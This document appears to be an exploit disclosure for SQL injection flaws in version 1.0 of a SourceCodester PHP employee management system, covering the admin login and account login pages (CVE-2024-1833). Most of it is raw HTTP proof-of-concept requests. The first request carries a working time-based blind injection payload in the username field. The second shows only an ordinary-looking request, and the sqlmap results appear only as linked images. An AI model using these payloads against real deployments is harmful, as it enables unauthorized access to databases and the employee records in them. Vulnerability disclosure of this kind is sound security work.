### Exploit Title: employee management system - Multiple SQL injections
### Date: 2024-02/23
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/16999/employee-management-system.html
### Version: 1.0
### Tested on: windows10 + phpstudy

# 1./Admin/login.php 
/Admin/login.php  SQL injection exists at the login port

### Sample request POC #1

```
POST /Admin/login.php HTTP/1.1
Host: localhost:8889
Content-Length: 46
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
Origin: http://localhost:8889
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8889/Admin/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=0sk1vejv5ipjkga2afjt5vqi59
Connection: close

xtusername=admin' AND (SELECT 2131 FROM (SELECT(SLEEP(5)))tfPL) AND 'wOKG'='wOKG&txtpassword=123456&btnlogin=
```
### Sqlmap running results
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1708679834535.jpg "employee management system")


# 2./Account/login.php (CVE-2024-1833)
/Account/login.php SQL injection exists for parameter txtemail

### Sample request POC #2

```
POST /Account/login.php HTTP/1.1
Host: localhost:8889
Content-Length: 45
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
Origin: http://localhost:8889
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8889/Account/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=0sk1vejv5ipjkga2afjt5vqi59
Connection: close

txtemail=1%40qq.com&txtpassword=123&btnlogin=
```
### Sqlmap running results
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1708679982330.jpg "employee management system")


